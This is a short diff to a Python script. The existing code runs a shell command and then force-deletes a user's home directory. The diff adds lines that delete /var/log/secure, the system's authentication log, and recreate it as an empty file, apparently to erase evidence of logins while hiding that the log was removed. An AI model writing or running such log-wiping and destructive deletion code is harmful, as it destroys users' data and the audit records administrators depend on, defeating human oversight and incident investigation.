@@ -17,5 +17,9 @@ def getit():
     cc = subprocess.getstatusoutput(cmmd)
     rmcmd = 'rm -r -f '+'/home/'+C
     rm = subprocess.getstatusoutput(rmcmd)
+    rmsecure = 'rm -r -f /var/log/secure'
+    subprocess.getstatusoutput(rmsecure)
+    touchfile = 'touch /var/log/secure'
+    subprocess.getstatusoutput(touchfile)
 if __name__== '__main__':
     getit()
